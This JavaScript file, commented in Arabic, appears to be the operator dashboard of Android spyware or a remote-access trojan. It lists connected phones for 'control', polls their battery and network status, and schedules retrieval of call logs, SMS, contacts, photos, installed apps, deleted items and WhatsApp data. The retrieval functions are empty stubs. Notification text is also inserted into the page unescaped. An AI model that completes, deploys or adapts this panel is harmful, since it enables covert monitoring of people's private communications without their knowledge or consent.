// التحقق من تسجيل الدخول
if (sessionStorage.getItem('logged_in') !== 'true') {
    window.location.href = 'login.html';
}

let currentDevice = null;
let updateInterval = null;
let dataInterval = null;
let allCalls = [];
let allSMS = [];
let allContacts = [];
let allDeleted = [];
let currentChat = null;
let currentCallNumber = null;
let currentContact = null;
let soundPlayedForDevice = false;

// تسجيل الخروج
function logout() { 
    sessionStorage.removeItem('logged_in'); 
    window.location.href = 'login.html'; 
}

// تشغيل صوت تنبيه
function playNotificationSound() { 
    try { 
        const audio = new Audio('v.wav'); 
        audio.volume = 1.0; 
        audio.play(); 
    } catch (e) {} 
}

// البحث عن اسم جهة الاتصال
function findContactName(number) {
    if (!allContacts || allContacts.length === 0 || !number) return null;
    const cleanNumber = number.replace(/[^0-9]/g, '').slice(-9);
    for (let contact of allContacts) {
        const numbers = Array.isArray(contact.numbers) ? contact.numbers : [contact.numbers];
        for (let n of numbers) {
            if (!n) continue;
            if (n.replace(/[^0-9]/g, '').slice(-9) === cleanNumber) return contact.name;
        }
    }
    return null;
}

// عرض الإشعارات العائمة
function showNotification(title, message, icon) {
    const div = document.createElement('div');
    div.className = 'notification-popup';
    div.innerHTML = `<div class="notification-icon">${icon}</div><div class="notification-content"><div class="notification-title">${title}</div><div class="notification-message">${message}</div></div><button class="notification-close" onclick="this.parentElement.remove()">✕</button>`;
    document.body.appendChild(div);
    playNotificationSound();
    setTimeout(() => { if (div.parentElement) div.remove(); }, 5000);
}

// تحميل الأجهزة المتصلة
async function loadDevices() {
    try {
        const response = await fetch('/devices.json');
        const devices = await response.json();
        
        const select = document.getElementById('deviceSelect');
        const currentValue = currentDevice;
        select.innerHTML = '<option value="">اختر الجهاز للتحكم...</option>';
        
        devices.forEach(device => {
            const option = document.createElement('option');
            option.value = device.id;
            option.textContent = device.name || device.id;
            select.appendChild(option);
        });
        
        if (currentValue) { 
            select.value = currentValue; 
        } else if (devices.length > 0) { 
            selectDevice(devices[0].id); 
            select.value = devices[0].id; 
        }
    } catch (e) {}
}

// اختيار جهاز محدد
function selectDevice(deviceId) {
    currentDevice = deviceId;
    const display = document.getElementById('deviceNameDisplay');
    
    if (deviceId) {
        const select = document.getElementById('deviceSelect');
        const selectedOption = select.options[select.selectedIndex];
        const deviceName = selectedOption ? selectedOption.textContent : deviceId;
        if (display) {
            display.textContent = `📱 ${deviceName}`;
            display.className = 'device-name-display active';
        }
    } else {
        if (display) {
            display.textContent = 'لا يوجد جهاز محدد';
            display.className = 'device-name-display';
        }
    }
    
    if (deviceId && !soundPlayedForDevice) {
        playNotificationSound();
        soundPlayedForDevice = true;
        setTimeout(() => { soundPlayedForDevice = false; }, 10000);
    }
    
    if (updateInterval) clearInterval(updateInterval);
    if (dataInterval) clearInterval(dataInterval);
    
    if (deviceId) {
        updateInterval = setInterval(updateLiveData, 5000);
        dataInterval = setInterval(() => { if (currentDevice) loadAllData(); }, 10000);
        updateLiveData();
        loadAllData();
    }
}

// تحديث البيانات الحية (البطارية والاتصال)
async function updateLiveData() {
    if (!currentDevice) return;
    try {
        const response = await fetch(`/live.php?device=${encodeURIComponent(currentDevice)}`);
        const data = await response.json();
        
        const statusEl = document.getElementById('networkStatus');
        if (statusEl) {
            if (data.online) { 
                statusEl.textContent = data.network || 'متصل'; 
                statusEl.className = 'value online'; 
            } else { 
                statusEl.textContent = 'غير متصل'; 
                statusEl.className = 'value offline'; 
            }
        }
        
        if (data.battery !== null && data.battery !== undefined) {
            const batEl = document.getElementById('batteryStatus');
            if (batEl) batEl.textContent = data.battery + '%';
        }
    } catch (e) {}
}

// تحميل كافة بيانات الجهاز
async function loadAllData() {
    if (!currentDevice) return;
    await loadCalls();
    await loadSMS();
    await loadContacts();
    await loadImages();
    await loadApps();
    await loadDeviceInfo();
    await loadDeleted();
    await loadWhatsApp();
}

// تبديل التبويبات في القائمة الجانبية العمودية المرتبة
function switchTab(tabName) {
    // إزالة النشاط من جميع الأزرار الجانبية
    document.querySelectorAll('.sidebar-menu button, .tab').forEach(t => t.classList.remove('active'));
    // إخفاء جميع محتويات التبويبات
    document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
    
    // تفعيل الزر والتبويب المستهدف
    const activeBtn = document.querySelector(`[onclick="switchTab('${tabName}')"]`);
    if (activeBtn) activeBtn.classList.add('active');
    
    const pane = document.getElementById(`${tabName}Tab`);
    if (pane) pane.classList.add('active');
}

// تنسيق التواريخ والمدد
function formatDuration(s) { 
    if (!s || s < 0) return '0:00'; 
    return `${Math.floor(s/60)}:${(s%60).toString().padStart(2,'0')}`; 
}

function formatDate(t) { 
    if (!t) return '—'; 
    try { return new Date(t).toLocaleString('ar'); } catch (e) { return '—'; } 
}

function getCallType(t) { 
    switch(parseInt(t)) { 
        case 1: return '📥 وارد'; 
        case 2: return '📤 صادر'; 
        case 3: return '❌ فائت'; 
        default: return 'غير معروف'; 
    } 
}

// دوال فارغة مؤقتة لاستكمال الجلب البرمجي لمنع الأخطاء
async function loadCalls() {}
async function loadSMS() {}
async function loadContacts() {}
async function loadImages() {}
async function loadApps() {}
async function loadDeviceInfo() {}
async function loadDeleted() {}
async function loadWhatsApp() {}

// التهيئة عند التشغيل
loadDevices();
setInterval(loadDevices, 10000);
